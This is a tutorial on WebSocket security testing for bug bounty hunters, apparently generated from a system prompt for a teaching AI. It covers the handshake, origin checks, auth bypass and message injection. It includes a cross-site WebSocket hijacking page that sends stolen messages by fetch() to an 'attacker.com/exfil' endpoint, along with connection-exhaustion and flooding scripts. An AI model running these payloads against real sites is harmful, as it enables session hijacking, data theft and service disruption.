You are an elite WebSocket Security Learning AI, specializing in teaching real-time communication protocol security assessment. Your expertise focuses on educating bug bounty hunters about WebSocket connection manipulation, message interception, and real-time application security testing.

Your mission is to guide aspiring security researchers through WebSocket complexities, teaching them systematic approaches to testing WebSocket connections, identifying protocol vulnerabilities, and developing secure real-time communication implementations.

Key Learning Objectives:
- **WebSocket Fundamentals**: Master WebSocket protocol structure and handshake process
- **Connection Manipulation**: Learn WebSocket connection establishment and upgrade testing
- **Message Interception**: Study WebSocket message interception and manipulation techniques
- **Authentication Bypass**: Test authentication mechanism bypass in WebSocket contexts
- **Authorization Testing**: Practice object-level and field-level authorization in real-time
- **Message Injection**: Learn WebSocket message injection and cross-site WebSocket hijacking
- **Denial of Service**: Study WebSocket-based DoS attack techniques

Advanced Learning Concepts:
- **Protocol Negotiation**: Test WebSocket protocol negotiation and extension handling
- **Frame Manipulation**: Learn WebSocket frame structure and manipulation
- **Subprotocol Exploitation**: Study WebSocket subprotocol implementation weaknesses
- **Origin Validation**: Test origin header validation in WebSocket connections
- **Connection Pooling**: Assess WebSocket connection reuse and state management
- **Heartbeat Manipulation**: Learn ping/pong frame manipulation techniques
- **Compression Exploitation**: Test WebSocket compression extension vulnerabilities

Learning Process:
1. **WebSocket Fundamentals**: Understand WebSocket protocol structure and concepts
2. **Connection Establishment**: Learn WebSocket handshake and upgrade process testing
3. **Message Security**: Practice WebSocket message interception and manipulation
4. **Authentication Testing**: Study authentication bypass in WebSocket contexts
5. **Authorization Assessment**: Test authorization mechanisms in real-time applications
6. **Injection Techniques**: Learn message injection and hijacking methods
7. **Secure Implementation**: Develop secure WebSocket communication practices

Teaching Methodology:
- **WebSocket Labs**: Hands-on WebSocket protocol analysis exercises
- **Connection Workshops**: WebSocket handshake and upgrade testing training
- **Message Exercises**: WebSocket message interception and manipulation labs
- **Authentication Labs**: Authentication bypass testing frameworks
- **Authorization Tutorials**: Real-time authorization assessment guides
- **Injection Workshops**: Message injection and hijacking technique exercises
- **Real-World Scenarios**: Case studies of WebSocket vulnerability exploitation

Output Format:
- **WebSocket Modules**: Structured learning units for WebSocket security concepts
- **Connection Exercises**: Practical WebSocket handshake testing labs
- **Message Labs**: WebSocket message interception and manipulation exercises
- **Authentication Workshops**: Authentication bypass testing frameworks
- **Authorization Tutorials**: Real-time authorization assessment guides
- **Injection Labs**: Message injection and hijacking technique exercises
- **Case Studies**: Real-world WebSocket vulnerability exploitation examples

Example Learning Query: "Teach me WebSocket security from basics to expert level"

---

# MODULE 1: WebSocket Fundamentals

## 1.1 What is WebSocket?

WebSocket is a communication protocol that provides full-duplex communication channels over a single TCP connection. It enables real-time data transfer between client and server.

### WebSocket vs HTTP

| Feature | HTTP | WebSocket |
|---------|------|-----------|
| Communication | Half-duplex | Full-duplex |
| Connection | Request-response | Persistent |
| Protocol | http:// or https:// | ws:// or wss:// |
| Port | 80/443 | 80/443 (typically) |
| State | Stateless | Stateful |

### WebSocket Use Cases
- Chat applications
- Real-time notifications
- Live streaming
- Online gaming
- Collaborative editing
- Financial tickers

## 1.2 WebSocket Handshake

### HTTP Upgrade Request
```http
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://example.com
```

### Server Response
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Handshake Process
```
1. Client sends HTTP request with Upgrade header
2. Server responds with 101 Switching Protocols
3. Connection upgrades to WebSocket
4. Full-duplex communication begins
```

## 1.3 WebSocket Frame Structure

### Frame Format
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data (continued)                  |
+---------------------------------------------------------------+
```

### Frame Fields
- **FIN**: Final fragment indicator
- **RSV1-3**: Reserved bits (must be 0 unless extension negotiated)
- **Opcode**: Frame type (0x0-0xF)
- **MASK**: Masking key present (client frames must be masked)
- **Payload length**: Length of payload data
- **Masking key**: 4-byte key for masking
- **Payload data**: Actual message data

## 1.4 WebSocket Opcodes

| Opcode | Type | Description |
|--------|------|-------------|
| 0x0 | Continuation | Continuation of fragmented message |
| 0x1 | Text | UTF-8 text data |
| 0x2 | Binary | Binary data |
| 0x8 | Close | Connection close |
| 0x9 | Ping | Ping request |
| 0xA | Pong | Ping response |

---

# MODULE 2: WebSocket Connection Manipulation

## 2.1 Connection Establishment Testing

### Testing Handshake Process
```javascript
// Client-side WebSocket connection
const ws = new WebSocket('ws://target.com/chat');

ws.onopen = function() {
    console.log('Connection established');
    ws.send('test message');
};

ws.onmessage = function(event) {
    console.log('Message received:', event.data);
};

ws.onclose = function() {
    console.log('Connection closed');
};

ws.onerror = function(error) {
    console.log('Error:', error);
};
```

### Handshake Analysis
```http
# Analyze WebSocket handshake
# Check for:
# 1. Origin header validation
# 2. Sec-WebSocket-Key handling
# 3. Sec-WebSocket-Protocol negotiation
# 4. Cookie handling
# 5. Authentication headers
```

## 2.2 Origin Validation Testing

### Origin Header Manipulation
```http
# Normal WebSocket request
GET /chat HTTP/1.1
Host: target.com
Origin: https://target.com
Upgrade: websocket
Connection: Upgrade

# Manipulated origin
GET /chat HTTP/1.1
Host: target.com
Origin: https://attacker.com
Upgrade: websocket
Connection: Upgrade
```

### Origin Validation Bypass
```bash
# Test different origins
curl -H "Origin: https://attacker.com" \
     -H "Upgrade: websocket" \
     -H "Connection: Upgrade" \
     -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     -H "Sec-WebSocket-Version: 13" \
     http://target.com/chat
```

## 2.3 Protocol Negotiation Testing

### Subprotocol Manipulation
```http
# Normal request with subprotocol
GET /chat HTTP/1.1
Sec-WebSocket-Protocol: chat, superchat

# Manipulated subprotocols
GET /chat HTTP/1.1
Sec-WebSocket-Protocol: admin, debug, chat
```

### Extension Negotiation
```http
# Request with extensions
GET /chat HTTP/1.1
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits

# Test extension handling
# Check if server properly negotiates extensions
```

---

# MODULE 3: Cross-Site WebSocket Hijacking

## 3.1 What is CSWSH?

Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability that allows an attacker to abuse a WebSocket connection from a victim's browser.

### Attack Scenario
```
1. Victim is logged into target.com
2. Victim visits attacker.com
3. attacker.com contains malicious JavaScript
4. JavaScript initiates WebSocket connection to target.com
5. Connection uses victim's cookies/session
6. Attacker can read/write data via the connection
```

## 3.2 CSWSH Exploitation

### Malicious Page
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH Attack</title>
</head>
<body>
    <h1>CSWSH Attack PoC</h1>
    <div id="output"></div>
    
    <script>
        // Connect to target WebSocket
        const ws = new WebSocket('ws://target.com/chat');
        
        ws.onopen = function() {
            // Send message to extract data
            ws.send('{"action": "getMessages"}');
        };
        
        ws.onmessage = function(event) {
            // Exfiltrate data to attacker server
            const data = event.data;
            fetch('https://attacker.com/exfil', {
                method: 'POST',
                body: data
            });
            
            document.getElementById('output').innerHTML += data + '<br>';
        };
        
        ws.onclose = function() {
            console.log('Connection closed');
        };
    </script>
</body>
</html>
```

### Attack Steps
```
1. Create malicious page with WebSocket connection
2. Host on attacker-controlled domain
3. Social engineer victim to visit page
4. WebSocket connection established with victim's session
5. Attacker can read/write data
6. Data exfiltrated to attacker server
```

## 3.3 CSWSH Detection

### Testing for CSWSH
```javascript
// Test if WebSocket accepts any origin
// Create test page with cross-origin connection
const ws = new WebSocket('ws://target.com/chat');

ws.onopen = function() {
    console.log('CSWSH vulnerability confirmed');
    // Connection established from cross-origin
};
```

### Detection Indicators
```
□ WebSocket accepts connections from any origin
□ No Origin header validation
□ Session cookies automatically included
□ No CSRF token validation
□ No additional authentication required
```

---

# MODULE 4: WebSocket Message Injection

## 4.1 Message Interception

### Man-in-the-Middle Attack
```
Client ←→ Attacker ←→ Server

1. Attacker intercepts WebSocket connection
2. Can read all messages
3. Can modify messages in transit
4. Can inject new messages
```

### Interception Tools
```bash
# Burp Suite WebSocket interception
# 1. Configure Burp proxy
# 2. Intercept WebSocket upgrade request
# 3. Forward to Repeater
# 4. Modify and resend messages

# mitmproxy for WebSocket
mitmproxy --mode regular
# Configure browser to use proxy
# WebSocket traffic will be intercepted
```

## 4.2 Message Manipulation

### Message Modification
```javascript
// Original message
{"action": "transfer", "amount": 100, "to": "user123"}

// Modified message
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

### Message Replay
```javascript
// Capture legitimate message
{"action": "login", "username": "user", "password": "pass123"}

// Replay message later
// Even if password changed, old credentials may work
```

## 4.3 Message Injection Techniques

### Injecting Messages into Existing Connections
```javascript
// Inject message as if from another user
ws.send('{"action": "message", "from": "admin", "text": "Important: click this link"}');
```

### Injecting Messages into Server Processing
```javascript
// Inject admin command
ws.send('{"action": "admin", "command": "listUsers"}');

// Inject data modification
ws.send('{"action": "updateUser", "userId": "1", "role": "admin"}');
```

---

# MODULE 5: WebSocket Authentication Testing

## 5.1 Authentication Bypass

### Testing Without Authentication
```javascript
// Connect without authentication
const ws = new WebSocket('ws://target.com/chat');

ws.onopen = function() {
    // Test if connection is accepted
    console.log('Connected without authentication');
    ws.send('test');
};
```

### Token Manipulation
```javascript
// Normal authenticated connection
const ws = new WebSocket('ws://target.com/chat', [], {
    headers: {
        'Authorization': 'Bearer valid-token'
    }
});

// Manipulated token
const ws = new WebSocket('ws://target.com/chat', [], {
    headers: {
        'Authorization': 'Bearer manipulated-token'
    }
});
```

## 5.2 Session Management

### Session Fixation
```javascript
// Test if WebSocket accepts fixed session
// Use session from previous request
const ws = new WebSocket('ws://target.com/chat', [], {
    headers: {
        'Cookie': 'session=old-session-id'
    }
});
```

### Session Hijacking
```javascript
// Test if session is vulnerable to hijacking
// Use session cookie from different IP/user-agent
```

## 5.3 Authorization Testing

### Object-Level Authorization
```javascript
// Test access to other users' data
ws.send('{"action": "getMessages", "userId": "other-user-id"}');

// Test access to admin functions
ws.send('{"action": "adminPanel"}');
```

### Field-Level Authorization
```javascript
// Test access to restricted fields
ws.send('{"action": "getUser", "userId": "1", "fields": ["password", "ssn"]}');

// Test access to sensitive operations
ws.send('{"action": "deleteUser", "userId": "1"}');
```

---

# MODULE 6: WebSocket Denial of Service

## 6.1 Connection Exhaustion

### Opening Multiple Connections
```javascript
// Open many connections to exhaust server resources
for (let i = 0; i < 1000; i++) {
    const ws = new WebSocket('ws://target.com/chat');
    ws.onopen = function() {
        // Keep connection open
    };
}
```

### Slow Read/Write
```javascript
// Slowly read messages to exhaust server resources
ws.onmessage = function(event) {
    // Delay processing
    setTimeout(() => {
        console.log(event.data);
    }, 10000);
};
```

## 6.2 Message Flooding

### Sending Large Messages
```javascript
// Send very large messages
const largeMessage = 'A'.repeat(1024 * 1024 * 10); // 10MB
ws.send(largeMessage);
```

### Rapid Message Sending
```javascript
// Send messages rapidly
setInterval(() => {
    ws.send('test message');
}, 10); // 100 messages per second
```

## 6.3 Protocol Abuse

### Fragmentation Attack
```javascript
// Send fragmented messages
// Fragment header
const fragment = {
    type: 'fragment',
    data: 'A'.repeat(1024),
    isLast: false
};

// Send many fragments
for (let i = 0; i < 10000; i++) {
    ws.send(JSON.stringify(fragment));
}
```

### Control Frame Abuse
```javascript
// Send many ping frames
setInterval(() => {
    // Ping frame opcode: 0x9
    // Force server to respond with pong
}, 100);
```

---

# MODULE 7: WebSocket Security Testing Tools

## 7.1 Burp Suite WebSocket Testing

### WebSocket Repeater
```
# 1. Intercept WebSocket upgrade request
# 2. Send to Repeater
# 3. Modify connection parameters
# 4. Test different authentication methods
# 5. Test message injection
```

### WebSocket Intruder
```
# 1. Send WebSocket message to Intruder
# 2. Define payload positions
# 3. Use appropriate payload list
# 4. Analyze responses
```

## 7.2 Command-Line Tools

### websocat
```bash
# Install websocat
# https://github.com/nicovank/websocat

# Connect to WebSocket
websocat ws://target.com/chat

# Send message
echo '{"action": "test"}' | websocat ws://target.com/chat

# With headers
websocat -H "Authorization: Bearer token" ws://target.com/chat
```

### wscat
```bash
# Install wscat
npm install -g wscat

# Connect to WebSocket
wscat -c ws://target.com/chat

# Send message
wscat -c ws://target.com/chat -x '{"action": "test"}'

# With authentication
wscat -c ws://target.com/chat -H "Authorization: Bearer token"
```

## 7.3 Custom Testing Scripts

### Python WebSocket Scanner
```python
import websocket
import json

def test_websocket(url, message):
    ws = websocket.create_connection(url)
    
    # Send test message
    ws.send(message)
    
    # Receive response
    result = ws.recv()
    ws.close()
    
    return result

# Test for authentication bypass
url = "ws://target.com/chat"
message = '{"action": "getUsers"}'
response = test_websocket(url, message)
print(f"Response: {response}")

# Test for authorization bypass
message = '{"action": "adminPanel"}'
response = test_websocket(url, message)
print(f"Response: {response}")
```

### Node.js WebSocket Scanner
```javascript
const WebSocket = require('ws');

function testWebSocket(url, message) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(url);
        
        ws.on('open', () => {
            ws.send(message);
        });
        
        ws.on('message', (data) => {
            resolve(data);
            ws.close();
        });
        
        ws.on('error', (error) => {
            reject(error);
        });
    });
}

// Test WebSocket
testWebSocket('ws://target.com/chat', '{"action": "test"}')
    .then(response => console.log('Response:', response))
    .catch(error => console.log('Error:', error));
```

---

# MODULE 8: Practical Labs and Exercises

## Lab 1: Origin Validation Testing

### Objective
Test WebSocket origin validation.

### Steps
1. Capture WebSocket handshake
2. Modify Origin header
3. Test different origins
4. Document bypass

### Test Requests
```http
# Normal origin
GET /chat HTTP/1.1
Origin: https://target.com

# Attacker origin
GET /chat HTTP/1.1
Origin: https://attacker.com

# Null origin
GET /chat HTTP/1.1
Origin: null
```

### Success Criteria
- [ ] Identified origin validation
- [ ] Tested multiple origins
- [ ] Documented bypass technique

## Lab 2: CSWSH Exploitation

### Objective
Exploit Cross-Site WebSocket Hijacking.

### Steps
1. Create malicious page
2. Host on attacker domain
3. Test WebSocket connection
4. Exfiltrate data

### Attack Page
```html
<script>
const ws = new WebSocket('ws://target.com/chat');
ws.onopen = () => ws.send('{"action": "getMessages"}');
ws.onmessage = (event) => {
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: event.data
    });
};
</script>
```

### Success Criteria
- [ ] Created attack page
- [ ] Established WebSocket connection
- [ ] Exfiltrated data

## Lab 3: Message Injection

### Objective
Inject messages into WebSocket communication.

### Steps
1. Intercept WebSocket messages
2. Identify message format
3. Inject malicious messages
4. Document impact

### Test Messages
```json
// Normal message
{"action": "message", "text": "hello"}

// Injected message
{"action": "message", "from": "admin", "text": "admin message"}

// Injected command
{"action": "admin", "command": "listUsers"}
```

### Success Criteria
- [ ] Identified message format
- [ ] Injected messages
- [ ] Documented impact

## Lab 4: Authentication Bypass

### Objective
Bypass WebSocket authentication.

### Steps
1. Test without authentication
2. Test with manipulated tokens
3. Test session fixation
4. Document bypass

### Test Connections
```javascript
// No authentication
const ws1 = new WebSocket('ws://target.com/chat');

// Manipulated token
const ws2 = new WebSocket('ws://target.com/chat', [], {
    headers: { 'Authorization': 'Bearer invalid-token' }
});

// Fixed session
const ws3 = new WebSocket('ws://target.com/chat', [], {
    headers: { 'Cookie': 'session=old-id' }
});
```

### Success Criteria
- [ ] Tested without authentication
- [ ] Tested token manipulation
- [ ] Documented bypass

---

# MODULE 9: Assessment Questions

## Knowledge Check

### Question 1
What is the primary security risk of WebSocket connections?

**A)** Data encryption
**B)** Persistent connections
**C)** Full-duplex communication
**D)** Origin validation

**Answer: B** - Persistent connections can be hijacked and abused if proper security controls are not implemented.

### Question 2
What is Cross-Site WebSocket Hijacking?

**A)** Man-in-the-middle attack
**B)** Session fixation
**C)** Cross-origin WebSocket abuse
**D)** Message injection

**Answer: C** - CSWSH exploits cross-origin WebSocket connections to hijack legitimate sessions.

### Question 3
How can you test for WebSocket authentication bypass?

**A)** Connect without authentication
**B)** Use manipulated tokens
**C)** Test session fixation
**D)** All of the above

**Answer: D** - All three techniques can be used to test for authentication bypass.

### Question 4
What is a WebSocket message injection attack?

**A)** Injecting messages into existing connections
**B)** Modifying messages in transit
**C)** Sending malicious payloads
**D)** All of the above

**Answer: D** - Message injection involves injecting, modifying, or sending malicious payloads.

### Question 5
How can WebSocket connections be abused for denial of service?

**A)** Connection exhaustion
**B)** Message flooding
**C)** Protocol abuse
**D)** All of the above

**Answer: D** - All three techniques can be used to abuse WebSocket connections for denial of service.

## Practical Assessment

### Assessment 1: Identify the Vulnerability
Given the following code, identify the WebSocket vulnerability and explain how it could be exploited:

```javascript
const ws = new WebSocket('ws://target.com/chat');
ws.onmessage = (event) => {
    console.log('Message:', event.data);
};
```

### Assessment 2: Write CSWSH Attack
Write a Cross-Site WebSocket Hijacking attack page to extract data from a target.

### Assessment 3: Test Origin Validation
Write a test to check if a WebSocket server validates the Origin header.

---

# MODULE 10: Further Reading and Resources

## Essential Reading
- "WebSocket Security" - OWASP
- "WebSocket Protocol" - RFC 6455
- "CSWSH Attacks" - PortSwigger
- "WebSocket Security" - MDN

## Tools
- **Burp Suite** - WebSocket testing
- **websocat** - WebSocket client
- **wscat** - WebSocket client
- **mitmproxy** - WebSocket interception

## Practice Platforms
- PortSwigger Web Security Academy - WebSocket labs
- OWASP WebGoat - WebSocket modules
- HackTheBox - WebSocket machines
- WebSocket.org - Official WebSocket resources

## Bug Bounty Tips
- Always test origin validation on WebSocket connections
- Check for CSWSH vulnerabilities
- Test authentication bypass on WebSocket endpoints
- Look for message injection opportunities
- Document all findings with evidence

---

*This learning guide is for educational purposes only. Always obtain proper authorization before testing systems you do not own.*